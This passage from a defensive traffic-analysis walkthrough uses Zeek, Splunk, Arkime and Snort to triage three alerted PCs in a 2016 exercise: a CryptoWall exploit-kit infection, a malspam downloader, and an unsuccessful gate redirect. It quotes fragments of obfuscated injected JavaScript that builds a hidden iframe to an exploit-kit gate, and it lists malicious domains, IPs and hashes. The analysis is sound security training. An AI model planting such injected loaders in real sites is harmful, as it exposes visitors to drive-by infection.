22:12:34  174.36.186.235  dariostoka.com                    8742953  200     d50f729942631.gif     application/x-dosexec   114688
22:12:47  184.168.173.1   freshanointingministries-sc.org   8742953  200     2487ff63fb4e79.gif    application/x-dosexec   145922
```

**[data] Reading:**

- **The same long `id=` on every request** — one victim ID — and `rnd` counting **…51, …52, …53**: three rounds, each round asking **all three sites**. A script working through a list.
- Round 1 got nothing. Rounds 2 and 3 got **six files**.
- The server says **`image/gif`** and names them `.gif`. Zeek looked inside: **`application/x-dosexec` = a Windows program** (starts with `MZ`). A disguise to get past filters that only read the label.
- No Referer, `MSIE 7.0` — not the browser.

### 4-3. Hashes (Splunk) { #pc-b-hashes }

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS rx_hosts="192.168.122.130" mime_type="application/x-dosexec"
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(tx_hosts) as from by md5 seen_bytes
```

- `stats … by md5 seen_bytes` groups identical files: how many times each was downloaded and from where.

```text
md5                                 seen_bytes  first     count  from
9f756e72eacc6b805481a49ce51c4a79    260613      22:11:58  2      216.158.85.7 174.36.186.235
d411bf37de7f72e98a62fc82917f50f7    260619      22:12:21  1      184.168.173.1
e851eb249d2c38d56d1b496a3112cebc    114688      22:12:30  2      216.158.85.7 174.36.186.235
92a4d0aeede3ce110b4121342df48496    145922      22:12:47  1      184.168.173.1
```

**[data]** 6 downloads, **4 different EXEs**. If you have `zeek:pe`, `index=zeek sourcetype=zeek:pe pcap_case=… | table ts id os compile_ts is_exe` shows they are Windows executables. These MD5s are of the **real programs** (not encrypted) — the host team can search for them on disk.

SHA256 (for the host team and for malware databases):

```text
95a9c8fccbe0e49dc132cf59d7ebf73e692da9f35491e0bfcac40b92c9022f5c  (260,613 B)
220a2e4f93d85f16dd74ed56247644e126b8d2d262374c4f09ec2be49cbcd0f3  (260,619 B)
306ab541cf4ace30c0f905ded4c26b40458c4dda28d9c5f00abd679ada6cf27d  (114,688 B)
227193160a2448dfa8bbbd2cf125afa9cca0d1a718b109a3adae5df8a24cdf6e  (145,922 B)
```

### 4-4. Anything after the downloads? { #pc-b-after }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.130 ts>=1452204775
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count by id_resp_h id_resp_p service
| sort first
```

- `ts>=1452204775` = from **22:12:55**, after the last download ended.

**What you should see:** only Yahoo Mail connections (124.108.101.10, 106.10.x) and DNS. **[data] No new destination after the downloads.**

**Conclusion for PC B:**

- **[data]** 6 s after webmail use, a script downloaded 4 different Windows programs (6 downloads) disguised as GIFs from 3 hacked websites.
- **[inference]** The source is a **malspam email with a script attachment** (the original exercise confirms zipped `.js` attachments). The downloaded programs are malware; whether they ran is not visible — no follow-up traffic in the 4 remaining minutes. **Treat the PC as infected.**

---

## Step 5 — PC C: 192.168.122.52 Jennifer-PC { #pc-c }

### 5-1. From a search to a gate { #pc-c-chain }

```spl
index=zeek sourcetype=zeek:http pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS id_orig_h=192.168.122.52 ts>=1452204540 ts<=1452204570
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S.%3N")
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
```

- A 30-second window, 22:09:00 – 22:09:30, to see what happened just before and after the odd request.
- \* For scripts Zeek may write `text/plain` or `application/javascript` — both mean "text, a script".

**What you should see (key rows):**

```text
t              host                 uri                                    referrer                                     status  mime*        len
22:09:05.759   ri.search.yahoo.com  /_ylt=…/RU=http%3a%2f%2fplanetside.co.uk%2f/…   http://au.search.yahoo.com/search?p=planetside.co.uk…
22:09:12.190   planetside.co.uk     /                                      http://au.search.yahoo.com/search?p=…         200     text/html    23509
22:09:20.017   planetside.co.uk     /media/system/js/mootools-core.js      http://planetside.co.uk/                     200     text/plain   99877
22:09:23.764   planetside.co.uk     /media/system/js/core.js               http://planetside.co.uk/                     200     text/plain   4784
22:09:24.829   st.domandvilma.com   /fvviewforumqn.php                     http://planetside.co.uk/                     200     text/plain   26
22:09:26.423   planetside.co.uk     /media/system/js/caption.js            http://planetside.co.uk/                     200
```

**[data] Reading:**

- The user searched Yahoo for `planetside.co.uk` and clicked the result — a 3-D landscape software site (Joomla).
- **22:09:24 — `st.domandvilma.com/fvviewforumqn.php`**, Referer = the planetside page. Something on the page called a server that has nothing to do with planetside.
- **The reply is only 26 bytes.** An EK landing page is kilobytes. Nothing from .52 goes anywhere odd after this.

### 5-2. Which file called the gate? (Arkime) { #pc-c-inject }

The Referer tells you **the page**, not **which script** on it. Use timing: the gate request comes right after `mootools-core.js` (22:09:20) and `core.js` (22:09:23). Open the larger one:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && ip.src == 192.168.122.52 && http.uri == /media/system/js/mootools-core.js
```

Search the response (Ctrl+F) for **`viewforum`**. The name `domandvilma` itself is **not** in plain text — it is written with escape codes (`\x6d` = `m`, `n` = `n`). Near the end of the normal MooTools code you find code that does not belong there:

```text
/* S4PoQHwRAGy */var jcvJp4p="\x75ser\x69dA0817FB25";var oD4RG9="30";
...
tdxwSOD.src="\x68ttp:\x2f/st.do\x6dandvilm\x61.com\x2f"+j7aMn(2,6)+"vi\x65wforum"+j7aMn(2,6)+".php"
...
function rkVOLS(){ ... if(main_color_handle.length==0){xco56v_(jcvJp4p,oD4RG9,48);return;} ...
  var FCPKqK="<iframe ... src='"+mClKFF+"' width=19 height=19 frameborder=0 scrolling='no'></iframe>"; ...
```

| Piece | Meaning |
|---|---|
| `"\x68ttp:\x2f/st.do\x6dandvilm\x61.com\x2f"` | `http://st.domandvilma.com/` with escape codes so a text search misses it |
| `j7aMn(2,6)+"viewforum"+j7aMn(2,6)+".php"` | random letters + `viewforum` + random letters + `.php` → `fvviewforumqn.php` |
| `if(main_color_handle.length==0){ … return; }` | **If the gate answers with an empty value, set a cookie and stop** |
| `<iframe … width=19 height=19 …>` | Otherwise build a tiny hidden iframe to the address the gate gave — that would be the exploit kit |

Now open the gate's reply:

```text
tags == 20160107_ALERTS_ON_3_DIFFERENT_HOSTS && host.http == st.domandvilma.com
```

```text
HTTP/1.1 200 OK
Content-Type: text/javascript; charset=ISO-8859-1
Set-Cookie: fltna=...; domain=st.domandvilma.com

var main_color_handle='';
```

**[data] The gate answered with an empty value.** By the script's own logic it stops: no iframe, no exploit kit. That matches the traffic — nothing malicious after 22:09:24.

**[inference] Why empty?** Gates like this hand out an EK address only to visitors they want (right browser, country, not seen before). This visit was filtered out. Lucky, but **the site is still hacked** — the next visitor may not be.

### 5-3. The rest of .52's traffic { #pc-c-rest }

From 22:15:29 the user browses `www.outdoorsamoa.com` and TripAdvisor. Same check as 5-1 for that window: only the site, Google fonts and TripAdvisor resources; no unknown domains, no `MSIE 7.0`, no EXE in `zeek:files`.

```spl
index=zeek sourcetype=zeek:files pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS rx_hosts="192.168.122.52"
| stats count by mime_type
```

**What you should see:** images, `text/html`, `text/plain` (scripts), fonts — **no `application/x-dosexec`, no Flash**.

**Conclusion for PC C:** **[data]** An injected script on a hacked site contacted a gate; the gate returned nothing and no exploit or download followed. **Not infected.** Report the hacked site.

---

## Step 6 — Simple Snort rules and a test { #snort }

One very simple rule per malicious activity. Snort on pcapbox sees all TCP payload, so a `content` match on a name in the `Host:` header is enough.

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"EK securetopc.top - Sung"; content:"securetopc.top"; nocase; sid:1000051; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"JS downloader counter id - Sung"; content:"/counter/?id="; nocase; sid:1000052; rev:1;)
alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"CryptoWall decrypt page waytopaytosystem.com - Sung"; content:"waytopaytosystem.com"; nocase; sid:1000053; rev:1;)
```

- `$HOME_NET any -> $EXTERNAL_NET 80` — from inside to outside port 80. `content` + `nocase` — this text anywhere in the packet, any case. `sid` 1000000+ = your own rules.

Add each rule on **one line** to `\\10.50.10.60\rules\local.rules`, then on pcapbox:

```bash
sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
snort-test 20160107_ALERTS_ON_3_DIFFERENT_HOSTS
```

**What you should see (about):** sid 1000051 for the 5 requests to `securetopc.top`, sid 1000052 for the 9 `/counter/?id=` requests, sid 1000053 for the requests to the payment site (17). If a count is a little higher, Snort matched the same text in a second packet of one request — open `index=snort pcap_case=20160107_ALERTS_ON_3_DIFFERENT_HOSTS | stats count by sid dest_ip` to check.

---

## Timeline (2016-01-07, UTC) { #timeline }

| Time | PC | Event |
|---|---|---|
| 22:05:47 | all | Capture starts; DHCP for .130, .52 (22:06:02), .132 (22:06:21) |
| 22:07:00–22:11:47 | B .130 | Yahoo Mail (HTTPS) |
| 22:08:49 | C .52 | Yahoo search for planetside.co.uk |
| 22:09:12 | C .52 | `planetside.co[.]uk` (hacked, injected script in `mootools-core.js`) |
| 22:09:24 | C .52 | Gate `st.domandvilma[.]com` → `var main_color_handle='';` → **nothing follows** |
| 22:10:08–10 | A .132 | Google result → `www.koeppl[.]com` (hacked, code before `<html>`) |
| 22:10:15 | A .132 | EK landing `uacltr.securetopc[.]top` (89.38.144.75) |
| 22:10:17 | A .132 | Flash exploit (83 KB) |
| 22:10:26 | A .132 | Encrypted payload (412 KB) from `gbesbsdsb.securetopc[.]top` |
| 22:10:47–22:12:14 | A .132 | `MSIE 7.0` POST check-ins to `bizsouls[.]com`, `estudiobarco.com[.]ar` |
| 22:11:53 | B .130 | Script starts `/counter/?id=` requests to 3 hacked sites |
| 22:11:58–22:12:47 | B .130 | 6 EXE downloads named `.gif` (4 unique) |
| 22:15:29 | C .52 | Normal browsing (outdoorsamoa, TripAdvisor) |
| 22:16:46–22:17:05 | A .132 | User opens the **CryptoWall "Decrypt service"** page on `3wzn5p2yiumh7akj.waytopaytosystem[.]com` |
| 22:17:18 | all | Capture ends |

---

## Indicators { #iocs }

| Indicator | Type | PC | Role |
|---|---|---|---|
| `www.koeppl[.]com` 92.51.131.150 | domain / IP | A | Hacked site (code before `<html>`) |
| `uacltr.securetopc[.]top`, `gbesbsdsb.securetopc[.]top` 89.38.144.75 | domain / IP | A | Exploit kit (landing, Flash, payload) |
| `bizsouls[.]com` 188.138.101.154, `estudiobarco.com[.]ar` 50.22.11.55 | domain / IP | A | CryptoWall check-ins (hacked sites) |
| `3wzn5p2yiumh7akj.waytopaytosystem[.]com` 95.128.181.144 | domain / IP | A | CryptoWall payment page (Tor gateway) |
| 6631e8c0d5f07004fabff81872f10d5e | MD5 | A | Flash exploit |
| `ma-wt.com[.]sa` 216.158.85.7, `dariostoka[.]com` 174.36.186.235, `freshanointingministries-sc[.]org` 184.168.173.1 | domain / IP | B | EXE downloads (`/counter/?id=`) |
| 9f756e72…4a79, d411bf37…7f50f7, e851eb24…cebc, 92a4d0ae…8496 | MD5 | B | Downloaded EXEs (4) |
| `planetside.co[.]uk` 67.225.139.108 | domain / IP | C | Hacked site (injected script) |
| `st.domandvilma[.]com` 192.185.21.183 | domain / IP | C | Gate (returned nothing) |

---

## Copy-ready queries { #query-sheet }

Replace `<case>` with your case name.

```spl
index=zeek pcap_case=<case> | stats count by sourcetype | sort - count
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval duration_min=round((last-first)/60,1) | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=192.168.0.0/16 | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first by id_orig_h | eval first=strftime(first,"%H:%M:%S") | sort first
index=zeek sourcetype=zeek:dhcp pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t client_addr assigned_addr mac host_name msg_types server_addr | sort t
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(host) as sites by id_orig_h user_agent | sort id_orig_h first
index=zeek sourcetype=zeek:dns pcap_case=<case> id_resp_p=53 | stats count by id_orig_h id_resp_h
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(method) as methods sum(response_body_len) as received by id_orig_h host | sort id_orig_h first
index=zeek sourcetype=zeek:conn pcap_case=<case> proto=tcp NOT id_resp_h=192.168.0.0/16 NOT [search index=zeek sourcetype=zeek:dns pcap_case=<case> | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h] | stats count by id_orig_h id_resp_h id_resp_p
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> ts>=<epoch> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S.%3N") | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S") | table t tx_hosts rx_hosts mime_type seen_bytes md5
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> method=POST | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | table t id_resp_h host uri user_agent request_body_len response_body_len
index=zeek pcap_case=<case> id_orig_h=<pc> (sourcetype=zeek:ssl OR sourcetype=zeek:http) | eval name=coalesce(server_name, mvdedup(host)) | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first max(t) as last count by sourcetype name | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> id_orig_h=<pc> uri="/counter/*" | eval host=mvdedup(host) | rex field=uri "rnd=(?<rnd>\d+)" | eval t=strftime(ts,"%H:%M:%S") | table t id_resp_h host rnd status_code resp_filenames resp_mime_types response_body_len
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" mime_type="application/x-dosexec" | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(tx_hosts) as from by md5 seen_bytes
index=zeek sourcetype=zeek:files pcap_case=<case> rx_hosts="<pc>" | stats count by mime_type
```

**Arkime**

```text
tags == <case> && ip.src == 192.168.122.132 && host.http == www.koeppl.com && http.uri == "/"
tags == <case> && host.http == 3wzn5p2yiumh7akj.waytopaytosystem.com
tags == <case> && ip.src == 192.168.122.52 && http.uri == /media/system/js/mootools-core.js
tags == <case> && host.http == st.domandvilma.com
tags == <case> && ip.src == 192.168.122.130 && http.uri == /counter/*
```

---

## Lessons { #lessons }

1. **Three alerts, three different answers.** An alert says "look here", not "infected". Decide per PC from what happened **after** the alert.
2. **Infected = something new runs.** PC A and B both show a **new User-Agent** (`MSIE 7.0`) that is not the browser. PC C never does.
3. **Size tells a lot.** A 26-byte reply cannot be an exploit kit; a 412 KB reply with no file type after a Flash file almost certainly is a payload.
4. **Labels lie, content does not.** `image/gif` + `.gif` names, but Zeek's `application/x-dosexec` says "program". Always compare `resp_filenames` with `resp_mime_types`.
5. **Read the injected code's logic, not just its address.** `if (main_color_handle.length==0) return;` explains why nothing happened on PC C.
6. **Not every method finds something.** The no-DNS subsearch found nothing here — all C2 used names. That is a result too.
7. **HTTPS hides the start of PC B's story.** Webmail timing (22:11:47 → 22:11:53) is the link; the attachment itself must come from the mailbox or the host.
8. **The user's own actions matter.** PC A's user opened the ransom payment page — tell the response team before anyone pays.

## References { #references }

- [Sorting through the alerts — same Splunk-first method](socgholish-fake-chrome-update-wscript-c2.md) · [Phishing red herring to EK drive-by](phishing-red-herring-ek-driveby-ursnif-c2.md)
- [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md)
- [Zeek logs](../../network/zeek/index.md) · [files.log](../../network/zeek/files-log.md) · [conn.log](../../network/zeek/conn-log.md)
- Original exercise: [malware-traffic-analysis.net — 2016-01-07 Alerts on 3 different hosts](https://malware-traffic-analysis.net/2016/01/07/index.html) · [answers](https://www.malware-traffic-analysis.net/2016/01/07/page2.html)
